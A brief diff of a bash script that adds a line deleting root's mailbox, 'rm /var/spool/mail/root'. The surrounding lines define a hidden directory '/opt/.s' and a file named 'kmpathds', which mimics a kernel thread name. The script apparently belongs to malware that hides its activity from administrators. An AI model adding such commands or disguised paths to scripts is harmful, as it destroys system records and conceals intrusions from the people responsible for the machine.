@@ -1,5 +1,5 @@
 #!/bin/bash
-
+rm /var/spool/mail/root 
 # 设置变量以提高可读性
 OPT_S_DIR="/opt/.s"
 KMPATHD_FILE="$OPT_S_DIR/kmpathds"
